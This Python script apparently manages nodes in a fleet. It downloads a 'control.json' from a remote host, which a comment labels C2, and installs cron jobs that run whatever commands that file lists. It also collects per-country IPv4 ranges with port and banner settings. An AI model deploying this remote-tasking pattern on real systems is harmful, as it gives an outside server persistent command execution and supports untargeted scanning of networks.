#!/usr/bin/python3

import os
import pwd
import json
import time
import socket
import requests
import crontab
import subprocess

def cleancron(myuser,mybasename):
        cleancrony = crontab.CronTab(user=str(myuser))
        cleancrony.remove_all(comment=mybasename)
        cleancrony.write_to_user(myuser)

def buildcron(myuser,mybasename,cmds,times):
        crony = crontab.CronTab(user=str(myuser))
        job = crony.new(command=cmds,comment=mybasename)
        job.setall(times)
        job.enable()
        print(job)
        crony.write_to_user(myuser)

def docrons():
        cronsdict = myvars()[3]
        mybasename = myhostname()
        #cleanup all old jobs
        for cleanup in cronsdict:
                cleanupjson = json.dumps(cleanup)
                cleanupuser = json.loads(cleanupjson)
                for myuser in cleanupuser:
                        cleancron(myuser,mybasename)
        #build all jobs from C2 json
        for hostcrondict in cronsdict:
                jayson = json.dumps(hostcrondict)
                usernames = json.loads(jayson)
                for user in usernames:
                        for jobs in usernames[user]:
                                jay = json.dumps(jobs)
                                thisjob = json.loads(jay)
                                for cmd in thisjob:
                                        myuser = str(user)
                                        mybasename = myhostname()
                                        mycmd = str(cmd)
                                        mytime = str(thisjob[cmd])
                                        print(str(user) + str(cmd) + str(thisjob[cmd]))
                                        buildcron(myuser,mybasename,mycmd,mytime)

def getcontroljson():
        get = requests.get("http://coolwebsite/control.json")
        jason = json.loads(get.text)
        return jason

def myvars():
        jayson = getcontroljson()
        for key in jayson.keys():
                if key == myhostname():
                        if isinstance(jayson[key], dict)== False:
                                for x in jayson[key]:
                                        jason = json.dumps(x)
                                        jout = json.loads(jason)
                                        myport = jout['port']
                                        myban = jout['banner']
                                        mycont = jout['continent']
                                        mycrons = jout['crons']
        return myport, myban, mycont, mycrons

def mycountries():
        countrycodes = []
        ccjson = requests.get("supercoolwebserver/cc.json")
        jason = json.loads(ccjson.text)
        for x in jason:
                if x['Continent_Name'] == myvars()[2]:
                        countrycodes.append(x['Two_Letter_Country_Code'] )
        return countrycodes

def subnetlookup(cc):
        ranges = []
        cctoasnapi = "veryniftydockerbabby/cc2asn-mini/db/"
        cctoasnapiend = "_IPV4"
        cleanurl = cctoasnapi + str(cc) + cctoasnapiend
        print(cleanurl)
        req = requests.get(cleanurl)
        for subnet in req.text.splitlines():
                ranges.append(subnet.replace("\n",""))
        time.sleep(1)
        return ranges

def mysubnets():
        for cc in mycountries():
                return subnetlookup(cc)

def myhostname():
        myhostname = str(socket.gethostname())
        return myhostname

def myztaddress():
        ztsubnet = "10.13.13"
        ips = []
        p = subprocess.Popen(["hostname", "-I"], stdout=subprocess.PIPE)
        term = p.stdout.read().decode('utf-8').replace("\n","chonker")
        out = term.split(" ")
        for x in out:
                if x.startswith(ztsubnet):
                        return x

def myuser():
        return pwd.getpwuid(os.getuid())[0]

def buildlvfile():
        file = open("/home/redactedusermeowmeow/localvars.txt","w+")
        file.write(str(myvars())+"\n")
        file.write(str(myhostname())+"\n")
        file.write(str(myztaddress())+"\n")
        file.write(str(mycountries())+"\n")
        file.close()

def getranges():
        for x in mycountries():
                thisfilename = "/home/redactedusermeowmeow/countries/" + str(x).lower() + "-ranges.txt"
                file = open(thisfilename, "w+")
                chonk = subnetlookup(x)
                if len(str(chonk)) >= 7:
                        file.write('\n'.join(chonk))
                file.close()

#main starts here
buildlvfile()
docrons()
#getranges()
